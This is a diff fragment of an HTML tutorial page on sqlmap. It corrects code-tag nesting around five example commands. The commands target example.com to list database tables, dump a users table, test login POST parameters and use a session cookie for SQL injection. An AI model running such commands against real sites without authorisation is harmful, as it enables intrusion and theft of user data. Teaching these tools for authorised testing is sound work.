@@ -159,27 +159,27 @@
     </p>
     <p>
         <strong>2. Extracting Tables from a Specific Database:</strong><br>
-        <pre><code>sqlmap -u "http://example.com/page.php?id=1" -D testdb --tables</pre></code><br>
+        <pre><code class="bash">sqlmap -u "http://example.com/page.php?id=1" -D testdb --tables</code></pre><br>
         This command lists all tables in the specified database testdb.
     </p>
     <p>
         <strong>3. Dumping Data from a Specific Table:</strong><br>
-        <pre><code>sqlmap -u "http://example.com/page.php?id=1" -D testdb -T users --dump</pre></code><br>
+        <pre><code class="bash">sqlmap -u "http://example.com/page.php?id=1" -D testdb -T users --dump</code></pre><br>
         This command extracts all data from the users table in the testdb database.
     </p>
     <p>
         <strong>4. Using POST Data for Injection:</strong><br>
-        <pre><code>sqlmap -u "http://example.com/login.php" --data="username=admin&password=12345"</pre></code><br>
+        <pre><code class="bash">sqlmap -u "http://example.com/login.php" --data="username=admin&password=12345"</code></pre><br>
         This command tests the login endpoint for SQL injection vulnerabilities using POST parameters.
     </p>
     <p>
         <strong>5. Extracting Specific Columns from a Table:</strong><br>
-        <pre><code>sqlmap -u "http://example.com/page.php?id=1" -D testdb -T users --dump --columns="username,email"</pre></code><br>
+        <pre><code class="bash">sqlmap -u "http://example.com/page.php?id=1" -D testdb -T users --dump --columns="username,email"</code></pre><br>
         This command retrieves only the username and email columns from the users table.
     </p>
     <p>
         <strong>6. Using Cookies for Authentication:</strong><br>
-        <pre><code>sqlmap -u "http://example.com/dashboard.php" --cookie="PHPSESSID=abcd1234"</pre></code><br>
+        <pre><code class="bash">sqlmap -u "http://example.com/dashboard.php" --cookie="PHPSESSID=abcd1234"</code></pre><br>
         This command uses a session cookie to authenticate and test for SQL injection.
     </p>
     <p>
